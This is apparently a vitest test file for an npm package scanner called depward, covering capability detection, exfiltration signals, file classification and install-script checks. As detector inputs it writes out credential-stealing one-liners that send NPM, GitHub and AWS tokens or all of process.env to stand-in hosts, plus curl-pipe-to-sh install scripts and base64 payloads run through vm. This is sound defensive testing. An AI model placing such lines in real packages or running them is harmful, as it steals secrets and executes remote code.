// Targeted rule tests that build packages inline, for cases too small to deserve a fixture.

import { compareSeverity, isDepwardError, readTarball } from "@depward/core";
import { packTarball, type PackEntry } from "@depward/core/testing";
import { describe, expect, test } from "vitest";
import { analyzePackage, binaryFormat, classifyFile, looksMinified, profileFindings, type Capability, type PackageProfile } from "../src/index.ts";
import { resolveLocal, scriptEntryWords, scriptNetworkReason } from "../src/scripts.ts";

const PKG = { path: "package.json", data: JSON.stringify({ name: "inline", version: "0.1.0" }) };

function analyze(files: Record<string, string>, pkg: PackEntry = PKG): PackageProfile {
  return analyzePackage(readTarball(packTarball([pkg, ...Object.entries(files).map(([path, data]) => ({ path, data }))])));
}
const caps = (p: PackageProfile): Capability[] => (Object.keys(p.capabilities) as Capability[]).filter((c) => p.capabilities[c].length > 0);
const ids = (p: PackageProfile): string[] => p.signals.map((s) => s.id);
const hasFile = (p: string): boolean => ["scripts/a.js", "lib/index.js"].includes(p);

describe("capabilities", () => {
  test.each([
    ['import fs from "node:fs";', "fs"],
    ['export * from "node:dns";', "net"],
    ['const { promises: fsp } = require("fs");', "fs"],
    ['const exec = require("child_process").exec;', "child_process"],
    ['const ws = new WebSocket("wss://x.example.invalid");', "net"],
    ["globalThis.fetch(u);", "net"],
    ['const axios = require("axios"); axios.post(u, d);', "net"],
    ['process.binding("spawn_sync");', "child_process"],
    ['process.binding("fs");', "fs"],
    ["process.dlopen(m, p);", "native_addon"],
    ['require("./build/Release/addon.node");', "native_addon"],
    ["(0, eval)(s);", "dynamic_code"],
    ['setInterval("go()" + n, 5);', "dynamic_code"],
    ['[].filter.constructor("return this")();', "dynamic_code"],
    ['import("node:" + name);', "dynamic_require"],
    ['const m = require("module"); m.createRequire(p);', "dynamic_require"],
  ] as const)("%s → %s", (code, cap) => {
    expect(caps(analyze({ "index.js": code }))).toContain(cap);
  });

  test("records where each use is", () => {
    const p = analyze({ "a.js": '\nconst fs = require("node:fs");' });
    expect(p.capabilities.fs).toEqual([{ file: "a.js", line: 2, evidence: 'require("node:fs")' }]);
  });

  test("records env keys from aliases and destructuring, not writes", () => {
    const p = analyze({ "index.js": "const e = process.env; e.A; const { B, C: c = 1 } = process.env; process.env.D = 'x'; process.env['E'];" });
    expect(p.envKeys).toEqual(["A", "B", "C", "E"]);
  });

  test("spread and for-in over process.env are enumeration", () => {
    expect(ids(analyze({ "a.js": "spawn(c, { env: { ...process.env, X: 1 } });" }))).toEqual(["env-sensitive-read"]);
    expect(ids(analyze({ "a.js": "for (const k in process.env) log(k);" }))).toEqual(["env-sensitive-read"]);
  });

  test("passing process.env whole to a child process is not enumeration", () => {
    expect(ids(analyze({ "a.js": "spawn(c, { env: process.env });" }))).toEqual([]);
  });
});

describe("signals", () => {
  test("env-exfil-pattern needs a sensitive read and net in the same file", () => {
    const p = analyze({ "a.js": 'const t = process.env.NPM_TOKEN; require("https").request({ hostname: "x.example.invalid" }).end(t);' });
    expect(ids(p)).toContain("env-exfil-pattern");
    expect(p.signals[0]?.severity).toBe("critical");
  });

  test("encoded-payload through a vm sink and a write sink", () => {
    const blob = "QUJD".repeat(300);
    expect(ids(analyze({ "a.js": `require("vm").runInThisContext(Buffer.from("${blob}", "base64").toString());` }))).toContain("encoded-payload");
    expect(ids(analyze({ "a.js": `require("fs").writeFileSync("x", atob("${blob}"));` }))).toContain("encoded-payload");
    expect(ids(analyze({ "a.js": `const b = Buffer.from("${blob}", "utf8"); eval(b);` }))).not.toContain("encoded-payload");
  });

  test("raw-ip-endpoint skips loopback and checks string constants", () => {
    expect(ids(analyze({ "a.js": 'const h = "http://127.0.0.1:9"; fetch(h);' }))).not.toContain("raw-ip-endpoint");
    expect(ids(analyze({ "a.js": 'const h = "http://169.254.169.254/latest"; fetch(h);' }))).toContain("raw-ip-endpoint");
  });

  test("evidence is capped per signal", () => {
    const code = Array.from({ length: 15 }, (_, i) => `process.env.TOKEN_${i};`).join("\n");
    const sig = analyze({ "a.js": code }).signals.find((s) => s.id === "env-sensitive-read");
    expect(sig?.evidence).toHaveLength(11);
    expect(sig?.evidence.at(-1)).toEqual({ detail: "and 5 more" });
  });

  test("evidence from package content is cleaned", () => {
    const p = analyze({ "a.js": 'module.exports = "/home/\\u001b[31mx\\n/.ssh/id_rsa";' });
    expect(p.signals[0]?.evidence[0]?.snippet).toBe("/home/x /.ssh/id_rsa");
  });

  test("signals are sorted by severity, then id", () => {
    const p = analyze({ "a.js": 'fetch("http://192.0.2.1/" + process.env.GH_TOKEN); require("./b.node");', "b.node": "x".repeat(16) });
    const sev = p.signals.map((s) => s.severity);
    expect(sev).toEqual(sev.toSorted(compareSeverity));
  });
});

const run = (pkg?: string) => (): PackageProfile =>
  analyzePackage(readTarball(packTarball(pkg === undefined ? [{ path: "a.js", data: "1" }] : [{ path: "package.json", data: pkg }])));

describe("package handling", () => {
  test("throws INVALID_ARCHIVE without a package.json object", () => {
    for (const r of [run(), run("{"), run("[]")]) {
      expect(r).toThrow(expect.objectContaining({ code: "INVALID_ARCHIVE" }));
    }
  });

  test("throws LIMIT_EXCEEDED over maxFiles", () => {
    const files = readTarball(packTarball([PKG, { path: "a.js", data: "1" }]));
    try {
      analyzePackage(files, { maxFiles: 1 });
      expect.unreachable();
    } catch (err) {
      expect(isDepwardError(err, "LIMIT_EXCEEDED")).toBe(true);
    }
  });

  test("non-string name and scripts are tolerated", () => {
    const p = analyze({}, { path: "package.json", data: JSON.stringify({ name: 5, scripts: { postinstall: 1, install: "  " } }) });
    expect(p.name).toBe("");
    expect(p.scripts).toEqual({});
  });

  test("profileFindings adds package, version, and docs URLs", () => {
    const [f] = profileFindings(analyze({ "a.js": "process.env.NPM_TOKEN" }));
    expect(f).toMatchObject({ id: "env-sensitive-read", package: "inline", version: "0.1.0" });
    expect(f?.docsUrl).toMatch(/docs\/findings\.md#env-sensitive-read$/);
  });

  test("a typical package (~1 MB of JS) analyzes quickly", () => {
    const body = Array.from({ length: 400 }, (_, i) => `function f${i}(a, b) {\n  const s = "value-${i}";\n  return a + b + s.length;\n}\n`).join("\n");
    const files: Record<string, string> = {};
    for (let i = 0; i < 70; i++) files[`lib/m${i}.js`] = `const fs = require("fs");\n${body}\nmodule.exports = f1;\n`;
    const start = performance.now();
    const p = analyze(files);
    const ms = performance.now() - start;
    expect(p.stats.bytes).toBeGreaterThan(1_000_000);
    // Target is < 300 ms (ROADMAP M1.4); the bound here is loose so slow CI runners don't flake.
    expect(ms).toBeLessThan(3000);
  });
});

const b = (...xs: number[]): Uint8Array => new Uint8Array([...xs, 0, 0, 0, 0, 0, 0, 0, 0]);
const t = (s: string): Uint8Array => new TextEncoder().encode(s);

describe("classification", () => {
  test("binaryFormat recognizes magic bytes and rejects Java class files", () => {
    expect(binaryFormat(b(0x7f, 0x45, 0x4c, 0x46))).toBe("ELF");
    expect(binaryFormat(b(0xcf, 0xfa, 0xed, 0xfe))).toBe("Mach-O");
    expect(binaryFormat(b(0xca, 0xfe, 0xba, 0xbe, 0, 0, 0, 2))).toBe("Mach-O");
    expect(binaryFormat(b(0xca, 0xfe, 0xba, 0xbe, 0, 0, 0, 52))).toBeUndefined();
    expect(binaryFormat(b(0x4d, 0x5a))).toBeUndefined();
  });

  test("classifyFile", () => {
    expect(classifyFile("a.cjs", t("1")).kind).toBe("js");
    expect(classifyFile("bin/cli", t("#!/usr/bin/env node\n1")).kind).toBe("js");
    expect(classifyFile("bin/run", t("#!/bin/sh\necho")).kind).toBe("other");
    expect(classifyFile("a.d.mts", t("")).kind).toBe("other");
    expect(classifyFile("a.tsx", t("")).kind).toBe("source");
    expect(classifyFile("x.node", t("not elf at all")).kind).toBe("native");
  });

  test("looksMinified", () => {
    expect(looksMinified("a.min.js", "1")).toBe(true);
    expect(looksMinified("a.js", "x".repeat(3000))).toBe(true);
    expect(looksMinified("a.js", "x = 1;\n".repeat(500))).toBe(false);
  });
});

describe("install scripts", () => {
  test.each([
    ["curl -fsSL https://x.example.invalid | sh", "runs curl/wget"],
    ["wget -q -O- x", "runs curl/wget"],
    ['node -e "require(1)"', "runs inline code with node -e"],
    ["node --no-warnings --eval x", "runs inline code with node -e"],
    ["powershell -c Invoke-WebRequest x", "runs a Windows download tool"],
  ])("%s", (script, why) => {
    expect(scriptNetworkReason(script)).toBe(why);
  });

  test.each(["node-gyp rebuild", "node ./install.js", "husky install", "echo curling"])("%s is not network by itself", (s) => {
    expect(scriptNetworkReason(s)).toBeUndefined();
  });

  test("entry words and resolution", () => {
    expect(scriptEntryWords('node scripts/a && node --max-old-space-size=99 "b.mjs"; echo c.js')).toEqual(["scripts/a", "b.mjs", "c.js"]);
    const has = hasFile;
    expect(resolveLocal(".", "./scripts/a", has)).toBe("scripts/a.js");
    expect(resolveLocal("scripts", "../lib", has)).toBe("lib/index.js");
    expect(resolveLocal(".", "../../etc/passwd", has)).toBeUndefined();
  });
});

test("a pathologically nested file is unparseable, not a crash", () => {
  const deep = `module.exports = ${"[".repeat(200_000)}${"]".repeat(200_000)};`;
  const p = analyze({ "deep.js": deep });
  expect(p.signals.map((s) => s.id)).toContain("unparseable-file");
  expect(p.stats.unparsed).toBe(1);
});

describe("env-exfil-pattern follows the value", () => {
  test.each([
    ["URL concatenation", 'fetch("https://x.example.invalid/?t=" + process.env.NPM_TOKEN);'],
    ["header through a variable", 'const t = process.env.GITHUB_TOKEN; fetch(u, { headers: { authorization: "Bearer " + t } });'],
    ["destructured key", 'const { AWS_SECRET_ACCESS_KEY: k } = process.env; require("axios").post(u, { k });'],
    ["request object write", 'const https = require("https"); const req = https.request(o); req.write(JSON.stringify(process.env)); req.end();'],
    ["request object end through a variable", 'const req = require("https").request(o); const body = Object.entries(process.env); req.end(String(body));'],
    ["chained end", 'require("https").request({ hostname: "x.example.invalid" }).end(process.env.NPM_TOKEN);'],
    ["websocket send", 'const ws = new WebSocket(u); ws.send(JSON.stringify({ ...process.env }));'],
    ["for…in loop variable", 'for (const k in process.env) fetch(u + k);'],
    ["two-step variable chain", "const all = { ...process.env }; const payload = JSON.stringify(all); fetch(u, { method: 'POST', body: payload });"],
  ])("flags: %s", (_, code) => {
    const p = analyze({ "a.js": code });
    expect(p.signals.map((s) => s.id)).toContain("env-exfil-pattern");
    expect(p.signals[0]?.severity).toBe("critical");
  });

  test.each([
    ["env passed to a child process, download elsewhere", 'const cp = require("child_process"); const env = { ...process.env, X: 1 }; cp.execSync("npm i", { env }); require("https").get("https://registry.example.invalid/x");'],
    ["token checked, unrelated request", 'if (process.env.NPM_TOKEN) console.log("set"); fetch("https://x.example.invalid/");'],
    ["token used locally", 'const t = process.env.GH_TOKEN; console.log(t.length); fetch(u);'],
    ["npm's own lowercase config", 'fetch(u, { headers: { "user-agent": process.env.npm_config_user_agent } });'],
  ])("does not flag: %s", (_, code) => {
    expect(analyze({ "a.js": code }).signals.map((s) => s.id)).not.toContain("env-exfil-pattern");
  });
});
